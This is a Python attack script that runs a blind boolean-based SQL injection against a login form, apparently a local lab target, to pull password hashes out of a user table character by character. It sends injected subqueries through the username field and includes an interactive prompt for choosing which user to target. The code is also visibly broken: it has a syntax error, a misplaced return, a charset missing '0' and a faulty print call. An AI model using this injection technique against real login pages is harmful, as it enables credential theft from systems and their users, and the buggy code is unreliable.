import requests

# Global variable to track the number of queries made
total_queries = 0

# The charset used to guess the password hash characters
charset = "123456789abcdef"

# The target URL for the SQL injection attack
target = "http://127.0.0.1:5000"

# The string to look for in the response to determine if the injection was successful
needle = "Welcome back"

# Function to perform the SQL injection query
def injected_query(payload):
    global total_queries
    # Send a POST request with the injected SQL payload
    r = requests.post(target, data={"username": "admin {}--".format(payload), "password": "password"})
    total_queries += 1
    # Check if the response does not contain the needle, indicating success
    return needle.encode() not in r.content

# Function to perform a boolean-based SQL injection to compare a specific character
def boolean_query(offset, user_id, character, operator=">"):
    # SQL payload to check if the character at the given offset is greater than the given character
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset + 1, user_id, operator, character)
    return injected_query(payload)

# Function to check if a user ID is invalid
def invalid_user(user_id):
    # SQL payload to check if the user ID exists
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

# Function to determine the length of the password for a given user ID
def password_length(user_id):
    i = 0
    while True:
        i += 1
        # SQL payload to determine if the password length is less than or equal to the current value of i
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        # If the query returns false, we've found the password length
        if not injected_query(payload):
            return i

# Function to extract the password hash character by character
def extract_hash(charset, user_id, password_length):
    found = ""
    # Iterate over each character position in the password
    for i in range(0, password_length):
        # Iterate over each character in the charset to find the correct one
        for j in range(len(charset)):
            # Use boolean_query to determine if the current character is correct
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]  # Add the correct character to the found password hash
                break
    return found

def extract_hash_bst(charset, user_id, password_length):
    found = ""
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1:
                if start == 0 and boolean_query(index, user_id, charset[start]):
                    found += charset(start)
                else:
                    found += charset[start + 1]
                break
            else
                middle = (start + end) // 2
                if boolean_query(index, user_id, charset[middle]):
                    end = middle
                else:
                    start = middle
        return found

# Function to print the total number of queries made
def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0

# Main loop to interactively extract password hashes
while True:
    try:
        # Ask the user for a user ID to target
        user_id = input("> Enter a user ID to extract the password hash: ")
        # Check if the user ID is valid
        if invalid_user(user_id):
            print("\t[X] User {} does not exist!".format(user_id))
        else:
            # Determine the password length for the given user ID
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            # Extract the password hash for the given user ID
            password_hash = extract_hash(charset, user_id, user_password_length)
            print("\t[-] User {} password hash: {}".format(user_id, password_hash))
            total_queries_taken()
            print("\t[-] User {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_length)))
            total_queries_taken()
    except KeyboardInterrupt:
        # Handle Ctrl+C to exit the program
        print("\n[!] Exiting...")
        break
